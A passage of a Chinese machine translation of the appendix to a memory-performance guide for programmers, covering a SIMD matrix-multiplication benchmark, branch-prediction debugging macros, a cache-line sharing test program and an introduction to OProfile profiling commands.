    <link href="/2024/04/29/%E6%AF%8F%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F%E5%91%98%E9%83%BD%E5%BA%94%E8%AF%A5%E4%BA%86%E8%A7%A3%E7%9A%84%E5%86%85%E5%AD%98%E7%9F%A5%E8%AF%86-Part9/"/>
    <url>/2024/04/29/%E6%AF%8F%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F%E5%91%98%E9%83%BD%E5%BA%94%E8%AF%A5%E4%BA%86%E8%A7%A3%E7%9A%84%E5%86%85%E5%AD%98%E7%9F%A5%E8%AF%86-Part9/</url>
    
    <content type="html"><![CDATA[<p>附录和参考书目</p><span id="more"></span><p><strong>注：本文由 <code>Kimi AI</code> 翻译</strong></p><h1 id="9-附录和参考文献"><a href="#9-附录和参考文献" class="headerlink" title="9 附录和参考文献"></a>9 附录和参考文献</h1><h2 id="9-1-矩阵乘法"><a href="#9-1-矩阵乘法" class="headerlink" title="9.1 矩阵乘法"></a>9.1 矩阵乘法</h2><p>这是第6.2.1节中矩阵乘法的完整基准程序。有关所用内联函数的详细信息，请参阅Intel的参考手册。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;emmintrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N 1000</span><br><span class="hljs-type">double</span> res[N][N] __attribute__ ((aligned (<span class="hljs-number">64</span>)));<br><span class="hljs-type">double</span> mul1[N][N] __attribute__ ((aligned (<span class="hljs-number">64</span>)));<br><span class="hljs-type">double</span> mul2[N][N] __attribute__ ((aligned (<span class="hljs-number">64</span>)));<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SM (CLS / sizeof (double)))</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>   <span class="hljs-comment">// ... 初始化 mul1 和 mul2</span><br>    <br>   <span class="hljs-type">int</span> i, i2, j, j2, k, k2;<br>   <span class="hljs-type">double</span> *<span class="hljs-keyword">restrict</span> rres;<br>   <span class="hljs-type">double</span> *<span class="hljs-keyword">restrict</span> rmul1;<br>   <span class="hljs-type">double</span> *<span class="hljs-keyword">restrict</span> rmul2;<br>   <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N; i += SM)<br>     <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; N; j += SM)<br>       <span class="hljs-keyword">for</span> (k = <span class="hljs-number">0</span>; k &lt; N; k += SM)<br>         <span class="hljs-keyword">for</span> (i2 = <span class="hljs-number">0</span>, rres = &amp;res[i][j], rmul1 = &amp;mul1[i][k]; i2 &lt; SM;<br>              ++i2, rres += N, rmul1 += N)<br>           &#123;<br>             _mm_prefetch (&amp;rmul1[<span class="hljs-number">8</span>], _MM_HINT_NTA);<br>             <span class="hljs-keyword">for</span> (k2 = <span class="hljs-number">0</span>, rmul2 = &amp;mul2[k][j]; k2 &lt; SM; ++k2, rmul2 += N)<br>               &#123;<br>                 __m128d m1d = _mm_load_sd (&amp;rmul1[k2]);<br>                 m1d = _mm_unpacklo_pd (m1d, m1d);<br>                 <span class="hljs-keyword">for</span> (j2 = <span class="hljs-number">0</span>; j2 &lt; SM; j2 += <span class="hljs-number">2</span>)<br>                   &#123;<br>                     __m128d m2 = _mm_load_pd (&amp;rmul2[j2]);<br>                     __m128d r2 = _mm_load_pd (&amp;rres[j2]);<br>                     _mm_store_pd (&amp;rres[j2],<br>                                   _mm_add_pd (_mm_mul_pd (m2, m1d), r2));<br>                   &#125;<br>               &#125;<br>           &#125;<br>   <br>   <span class="hljs-comment">// ... 使用 res 矩阵</span><br>   <br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>循环结构与第6.2.1节中的最终版本大致相同。最大的变化是加载 <code>rmul1[k2]</code> 的值已经从内循环中提取出来，因为我们必须创建一个向量，其中两个元素具有相同的值。这就是 <code>_mm_unpacklo_pd()</code> 内联函数的作用。</p><p>另一个值得注意的是，我们显式对齐了三个数组，以确保我们期望在同一缓存行中的值实际上确实在那里。</p><h2 id="9-2-调试分支预测"><a href="#9-2-调试分支预测" class="headerlink" title="9.2 调试分支预测"></a>9.2 调试分支预测</h2><p>如果按照第6.2.2节的建议使用 <code>likely</code> 和 <code>unlikely</code> 的定义，使用GNU工具链很容易有一个调试模式来检查假设是否真的成立。宏的定义可以替换为以下内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> DEBUGPRED</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> unlikely(expr) __builtin_expect (!!(expr), 0)</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> likely(expr) __builtin_expect (!!(expr), 1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-keyword">asm</span> (<span class="hljs-string">&quot;.section predict_data, \&quot;aw\&quot;; .previous\n&quot;</span><br>     <span class="hljs-string">&quot;.section predict_line, \&quot;a\&quot;; .previous\n&quot;</span><br>     <span class="hljs-string">&quot;.section predict_file, \&quot;a\&quot;; .previous&quot;</span>);<br><span class="hljs-meta"># <span class="hljs-keyword">ifdef</span> __x86_64__</span><br><span class="hljs-meta">#  <span class="hljs-keyword">define</span> debugpred__(e, E) \</span><br><span class="hljs-meta">   (&#123; long int _e = !!(e); \</span><br><span class="hljs-meta">      asm volatile (<span class="hljs-string">&quot;.pushsection predict_data\n&quot;</span></span><br>                    <span class="hljs-string">&quot;..predictcnt%=: .quad 0; .quad 0\n&quot;</span><br>                    <span class="hljs-string">&quot;.section predict_line; .quad %c1\n&quot;</span><br>                    <span class="hljs-string">&quot;.section predict_file; .quad %c2; .popsection\n&quot;</span><br>                    <span class="hljs-string">&quot;addq $1,..predictcnt%=(,%0,8)&quot;</span> \<br>                    : : <span class="hljs-string">&quot;r&quot;</span> (_e == E), <span class="hljs-string">&quot;i&quot;</span> (__LINE__), <span class="hljs-string">&quot;i&quot;</span> (__FILE__)); \<br>     __builtin_expect (_e, E); \<br>   &#125;)<br><span class="hljs-meta"># <span class="hljs-keyword">elif</span> defined __i386__</span><br><span class="hljs-meta">#  <span class="hljs-keyword">define</span> debugpred__(e, E) \</span><br><span class="hljs-meta">   (&#123; long int _e = !!(e); \</span><br><span class="hljs-meta">      asm volatile (<span class="hljs-string">&quot;.pushsection predict_data\n&quot;</span></span><br>                    <span class="hljs-string">&quot;..predictcnt%=: .long 0; .long 0\n&quot;</span><br>                    <span class="hljs-string">&quot;.section predict_line; .long %c1\n&quot;</span><br>                    <span class="hljs-string">&quot;.section predict_file; .long %c2; .popsection\n&quot;</span><br>                    <span class="hljs-string">&quot;incl ..predictcnt%=(,%0,4)&quot;</span> \<br>                    : : <span class="hljs-string">&quot;r&quot;</span> (_e == E), <span class="hljs-string">&quot;i&quot;</span> (__LINE__), <span class="hljs-string">&quot;i&quot;</span> (__FILE__)); \<br>     __builtin_expect (_e, E); \<br>   &#125;)<br><span class="hljs-meta"># <span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#  <span class="hljs-keyword">error</span> <span class="hljs-string">&quot;debugpred__ definition missing&quot;</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> unlikely(expt) debugpred__ ((expr), 0)</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> likely(expr) debugpred__ ((expr), 1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br></code></pre></td></tr></table></figure><p>这些宏使用GNU汇编器和链接器提供的大量功能，在创建ELF文件时。<code>DEBUGPRED</code> 情况下的第一个 <code>asm</code> 语句定义了三个额外的节；它主要向汇编器提供有关如何创建节的信息。所有节在运行时都是可用的，<code>predict_data</code> 节是可写的。重要的是所有节名称都是有效的C标识符。原因很快就会清楚。</p><p>新的 <code>likely</code> 和 <code>unlikely</code> 宏的定义引用了特定于机器的 <code>debugpred__</code> 宏。这个宏有以下任务：</p><ol><li><p>在 <code>predict_data</code> 节中分配两个词以包含正确和不正确预测的计数。这两个字段通过使用 <code>%=</code> 获得唯一名称；前导点确保符号不会污染符号表。</p></li><li><p>在 <code>predict_line</code> 节中分配一个词以包含 <code>likely</code> 或 <code>unlikely</code> 宏使用的行号。</p></li><li><p>在 <code>predict_file</code> 节中分配一个词以包含 <code>likely</code> 或 <code>unlikely</code> 宏使用的文件名的指针。</p></li><li><p>根据表达式 <code>e</code> 的实际值增加为此宏创建的“正确”或“不正确”计数器。我们这里不使用原子操作，因为它们要慢得多，而且在发生冲突的不太可能的情况下绝对精度不是那么重要。如果需要，很容易更改。</p></li></ol><p><code>.pushsection</code> 和 <code>.popsection</code> 伪操作在汇编器手册中有描述。感兴趣的读者被要求使用手册和一些试错来探索这些定义的细节。</p><p>这些宏自动且透明地处理收集关于正确和不正确分支预测的信息。缺少的是如何获取结果的方法。最简单的方法是为对象定义一个析构函数并在其中打印结果。这可以通过像这样定义的函数实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> __start_predict_data;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> __stop_predict_data;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> __start_predict_line;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__start_predict_file;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br>__attribute__ ((destructor))<br>predprint(<span class="hljs-type">void</span>)<br>&#123;<br>   <span class="hljs-type">long</span> <span class="hljs-type">int</span> *s = &amp;__start_predict_data;<br>   <span class="hljs-type">long</span> <span class="hljs-type">int</span> *e = &amp;__stop_predict_data;<br>   <span class="hljs-type">long</span> <span class="hljs-type">int</span> *sl = &amp;__start_predict_line;<br>   <span class="hljs-type">const</span> <span class="hljs-type">char</span> **sf = &amp;__start_predict_file;<br>   <span class="hljs-keyword">while</span> (s &lt; e) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s:%ld: incorrect=%ld, correct=%ld%s\n&quot;</span>, *sf, *sl, s[<span class="hljs-number">0</span>], s[<span class="hljs-number">1</span>],<br>             s[<span class="hljs-number">0</span>] &gt; s[<span class="hljs-number">1</span>] ? <span class="hljs-string">&quot;   ==== WARNING&quot;</span> : <span class="hljs-string">&quot;&quot;</span>);<br>      ++sl;<br>      ++sf;<br>      s += <span class="hljs-number">2</span>;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里，节名称是有效的C标识符这一事实得到了应用；它被GNU链接器用来自动定义（如果需要的话）两个节的符号。<code>__start_XYZ</code> 符号对应于节 <code>XYZ</code> 的开始，而 <code>__stop_XYZ</code> 是节 <code>XYZ</code> 之后的第一个字节的位置。这些符号使得在运行时可以迭代节内容。请注意，由于节的内容可能来自链接器在链接时使用的所有文件，因此编译器和汇编器没有足够的信息来确定节的大小。只有通过这些神奇的链接器生成的符号，才能迭代节内容。</p><p>代码不仅仅迭代一个节；而是涉及三个节。由于我们知道，对于 <code>predict_data</code> 节中添加的每两个字，我们向 <code>predict_line</code> 和 <code>predict_file</code> 节各自添加一个字，我们不必检查这两个节的边界。我们只需携带指针并统一递增它们。</p><p>代码为代码中出现的每个预测打印出一行。它突出显示了预测不正确的用法。当然，这可以更改，并且调试模式可以限制为仅标记不正确预测多于正确预测的条目。这些是需要更改的候选项。还有一些细节使问题复杂化；例如，如果分支预测发生在在多个地方使用的宏中，则必须一起考虑所有宏用法，然后才能做出最终判断。</p><p>最后两个评论：这种调试操作所需的数据不小，而且，在DSOs的情况下，是昂贵的（必须重新定位 <code>predict_file</code> 节）。因此，不应在生产二进制文件中启用调试模式。最后，每个可执行文件和DSO都创建自己的输出，分析数据时必须记住这一点。</p><h2 id="9-3-测量缓存行共享开销"><a href="#9-3-测量缓存行共享开销" class="headerlink" title="9.3 测量缓存行共享开销"></a>9.3 测量缓存行共享开销</h2><p>本节包含测试程序，用于测量使用同一缓存行上的变量与使用不同缓存行上的变量的开销。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;error.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N (atomic ? 10000000 : 500000000)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> atomic;<br><span class="hljs-type">static</span> <span class="hljs-type">unsigned</span> nthreads;<br><span class="hljs-type">static</span> <span class="hljs-type">unsigned</span> disp;<br><span class="hljs-type">static</span> <span class="hljs-type">long</span> **reads;<br><br><span class="hljs-type">static</span> <span class="hljs-type">pthread_barrier_t</span> b;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">tf</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>   <span class="hljs-type">long</span> *p = arg;<br><br>   <span class="hljs-keyword">if</span> (atomic)<br>     <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> n = <span class="hljs-number">0</span>; n &lt; N; ++n)<br>       __sync_add_and_fetch(p, <span class="hljs-number">1</span>);<br>   <span class="hljs-keyword">else</span><br>     <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> n = <span class="hljs-number">0</span>; n &lt; N; ++n)<br>       &#123;<br>         *p += <span class="hljs-number">1</span>;<br>         <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span> : : <span class="hljs-string">&quot;m&quot;</span> (*p))</span>;<br>       &#125;<br><br>   <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>   <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>)<br>     disp = <span class="hljs-number">0</span>;<br>   <span class="hljs-keyword">else</span><br>     disp = atol(argv[<span class="hljs-number">1</span>]);<br><br>   <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">3</span>)<br>     nthreads = <span class="hljs-number">2</span>;<br>   <span class="hljs-keyword">else</span><br>     nthreads = atol(argv[<span class="hljs-number">2</span>]) ?: <span class="hljs-number">1</span>;<br><br>   <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">4</span>)<br>     atomic = <span class="hljs-number">1</span>;<br>   <span class="hljs-keyword">else</span><br>     atomic = atol(argv[<span class="hljs-number">3</span>]);<br><br>   pthread_barrier_init(&amp;b, <span class="hljs-literal">NULL</span>, nthreads);<br><br>   <span class="hljs-type">void</span> *p;<br>   posix_memalign(&amp;p, <span class="hljs-number">64</span>, (nthreads * disp ?: <span class="hljs-number">1</span>) * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>));<br>   <span class="hljs-type">long</span> *mem = p;<br><br>   <span class="hljs-type">pthread_t</span> th[nthreads];<br>   <span class="hljs-type">pthread_attr_t</span> a;<br>   pthread_attr_init(&amp;a);<br>   <span class="hljs-type">cpu_set_t</span> c;<br>   <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> i = <span class="hljs-number">1</span>; i &lt; nthreads; ++i)<br>     &#123;<br>        CPU_ZERO(&amp;c);<br>        CPU_SET(i, &amp;c);<br>        pthread_attr_setaffinity_np(&amp;a, <span class="hljs-keyword">sizeof</span>(c), &amp;c);<br>        mem[i * disp] = <span class="hljs-number">0</span>;<br>        pthread_create(&amp;th[i], &amp;a, tf, &amp;mem[i * disp]);<br>     &#125;<br><br>   CPU_ZERO(&amp;c);<br>   CPU_SET(<span class="hljs-number">0</span>, &amp;c);<br>   pthread_setaffinity_np(pthread_self(), <span class="hljs-keyword">sizeof</span>(c), &amp;c);<br>   mem[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>   tf(&amp;mem[<span class="hljs-number">0</span>]);<br><br>   <span class="hljs-keyword">if</span> ((disp == <span class="hljs-number">0</span> &amp;&amp; mem[<span class="hljs-number">0</span>] != nthreads * N)<br>       || (disp != <span class="hljs-number">0</span> &amp;&amp; mem[<span class="hljs-number">0</span>] != N))<br>     error(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&quot;mem[0] wrong: %ld instead of %d&quot;</span>,<br>            mem[<span class="hljs-number">0</span>], disp == <span class="hljs-number">0</span> ? nthreads * N : N);<br><br>   <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> i = <span class="hljs-number">1</span>; i &lt; nthreads; ++i)<br>     &#123;<br>        pthread_join(th[i], <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">if</span> (disp != <span class="hljs-number">0</span> &amp;&amp; mem[i * disp] != N)<br>          error(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&quot;mem[%u] wrong: %ld instead of %d&quot;</span>, i, mem[i * disp], N);<br>     &#125;<br><br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>代码主要作为示例提供，演示如何编写测量缓存行开销等效果的程序。循环体中的 <code>tf</code> 是有趣的部分。已知编译器的 <code>__sync_add_and_fetch</code> 内联函数生成原子添加指令。在第二个循环中，我们必须“使用”增加的结果（通过内联 <code>asm</code> 语句）。<code>asm</code> 不引入任何实际代码；相反，它防止编译器将增加操作提升出循环。</p><p>第二个有趣的部分是程序将线程固定在特定处理器上。代码假设处理器编号为0到3，如果机器有四个或更多逻辑处理器，这通常是这种情况。代码可以使用 libNUMA 接口来确定可用处理器的编号，但是这个测试程序应该在不引入此依赖性的情况下广泛可用。很容易以这样或那样的方式进行修复。</p><h1 id="10-OProfile技巧"><a href="#10-OProfile技巧" class="headerlink" title="10 OProfile技巧"></a>10 OProfile技巧</h1><p>以下不是关于如何使用oprofile的教程。关于这个主题已经写了很多文档。相反，它旨在提供一些更高层次的提示，如何查看自己的程序以找到可能的问题点。但在那之前，我们至少必须有一个关于oprofile的最小介绍。</p><h2 id="10-1-Oprofile基础知识"><a href="#10-1-Oprofile基础知识" class="headerlink" title="10.1 Oprofile基础知识"></a>10.1 Oprofile基础知识</h2><p>Oprofile的工作分为两个阶段：收集然后分析。收集由内核执行；它不能在用户级别完成，因为测量使用CPU的性能计数器。这些计数器需要访问MSRs，这反过来又需要特权。</p><p>每个现代处理器都提供自己的性能计数器集。在某些架构上，所有处理器实现都提供了计数器的一个子集，而其他计数器则因版本而异。这使得给出关于使用oprofile的一般建议变得困难。还没有（尚未）一个更高层次的抽象来隐藏这些细节。</p><p>处理器版本还控制着任何时候可以跟踪的事件数量，以及它们的组合方式。这为情况增加了更多的复杂性。</p><p>如果用户了解有关性能计数器的必要的详细信息，可以使用opcontrol程序来选择要计数的事件。对于每个事件，需要指定“溢出编号”（在记录事件之前必须发生的事件数量），事件是否应计入用户级别和&#x2F;或内核，最后是“单元掩码”（它选择性能计数器的子功能）。</p><p>要在x86和x86-64处理器上计数CPU周期，必须发出以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">opcontrol --event CPU_CLK_UNHALTED:30000:0:1:1<br></code></pre></td></tr></table></figure><p>数字30000是溢出编号。选择一个合理的值对于系统的行为和收集的数据很重要。要求接收有关事件的每个发生的数据是一个坏主意。对于许多事件，这将使机器停止运行，因为它将只工作在数据收集事件溢出上；这就是为什么oprofile强制执行最小值的原因。不同事件的最小值不同，因为不同事件在正常代码中被触发的概率不同。</p><p>选择一个非常高的数字会降低概要文件的分辨率。在每个溢出处，oprofile会记录此时执行的指令的地址；对于x86和PowerPC，在某些情况下，它还可以记录回溯。{<em>回溯支持有望在某个时候对所有架构都可用。}</em> 通过粗略分辨率，热点可能不会获得代表性的命中数；这一切都是关于概率，这就是为什么oprofile被称为概率分析器。溢出编号越低，对系统的影响就越大，就减速而言，但分辨率越高。</p><p>如果要分析特定程序，并且系统不用于生产，通常最有用的是使用尽可能低的溢出值。每个事件的确切值可以使用查询：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">opcontrol --list-events<br></code></pre></td></tr></table></figure><p>如果被分析程序与另一个进程交互，并且减速导致交互出现问题，则可能会出现问题。如果进程有一些实时要求，在经常被中断时无法满足，那么必须找到中间地带。如果整个系统要在长时间内进行分析，情况也是如此。一个低的溢出编号将意味着巨大的减速。在任何情况下，oprofile和任何其他分析机制一样，都会引入不确定性和不准确性。</p><p>分析必须使用 <code>opcontrol --start</code> 启动，并且可以用 <code>opcontrol --stop</code> 停止。当oprofile处于活动状态时，它会收集数据；这些数据首先在内核中收集，然后以批次发送到用户级守护程序，在那里进行解码并写入文件系统。使用 <code>opcontrol --dump</code> 可以请求将内核中缓冲的所有信息释放到用户级。</p><p>收集的数据可以包含来自不同性能计数器的事件。除非用户选择在单独的oprofile运行之间清除存储的数据，否则所有数字都保持并行。可以在同一事件的不同场合累积数据。如果在不同的分析运行期间遇到事件，则如果用户选择这样做，数字将被累加。</p><p>用户级数据收集过程的后半部分将数据多路分解。每个文件的数据单独存储。甚至可以区分由各个可执行文件使用的DSOs，甚至可以区分个别线程的数据。通过这种方式产生的数据可以使用 <code>oparchive</code> 进行归档。由此命令生成的文件可以传输到另一台机器上，然后在那里进行分析。</p><p>使用opreport程序可以从分析结果生成报告。使用opannotate可以查看各种事件发生的位置：哪个指令，如果数据可用，在哪个源代码行。这使得找到热点变得容易。计数CPU周期将指出大部分时间花费在哪里（包括缓存未命中），而计数退休指令则允许找到大部分执行指令的位置——这两者之间有很大的差异。</p><p>单个命中一个地址通常没有意义。统计分析的一个副作用是，只执行几次，甚至只执行一次的指令，可能会被归因于一个命中。在这种情况下，通过重复验证结果是非常必要的。</p><h2 id="10-2-它看起来像什么"><a href="#10-2-它看起来像什么" class="headerlink" title="10.2 它看起来像什么"></a>10.2 它看起来像什么</h2><p>一个oprofile会话可以像这样简单：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">opcontrol -i cachebench</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">opcontrol -e INST_RETIRED:6000:0:0:1 --start</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">./cachebench ...</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">opcontrol -h</span><br></code></pre></td></tr></table></figure><p>请注意，包括实际程序在内的这些命令都是以root身份运行的。这里以root身份运行程序只是为了简单起见；程序可以由任何用户执行，oprofile会注意到它。下一步是分析数据。使用opreport我们可以看到：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">CPU: Core 2, speed 1596 MHz (estimated)<br>Counted INST_RETIRED.ANY_P events (number of instructions retired) with a unit mask of<br>0x00 (No unit mask) count 6000<br>INST_RETIRED:6000|<br>   samples|      %|<br>------------------<br>    116452 100.000 cachebench<br></code></pre></td></tr></table></figure><p>这意味着我们收集了一堆事件；现在可以使用opannotate以更详细地查看数据。我们可以看到程序中记录了最多事件的位置。<code>opannotate --source</code>输出的一部分看起来像这样：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">:static void<br>:inc (struct l *l, unsigned n)<br>:&#123;<br>:  while (n-- &gt; 0) /* inc total:  13980 11.7926 */<br>:    &#123;<br>:      5  0.0042 :      ++l-&gt;pad[0].l;<br>:  13974 11.7875 :      l = l-&gt;n;<br>:      1 8.4e-04 :      asm volatile (&quot;&quot; :: &quot;r&quot; (l));<br>:    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这是测试的内部函数，大部分时间都花在这里。我们看到样本分布在循环的所有三行上。这主要是因为采样并不总是100%准确地记录记录的指令指针。CPU执行指令的顺序可能会变化；重建确切的执行顺序以产生正确的指令指针是很难的。最新的CPU版本尝试为少数事件这样做，但通常情况下，这并不值得努力——或者根本不可能。在大多数情况下，这并不重要。即使存在正态分布的样本集，程序员也应该能够弄清楚发生了什么。</p><h2 id="10-3-开始分析"><a href="#10-3-开始分析" class="headerlink" title="10.3 开始分析"></a>10.3 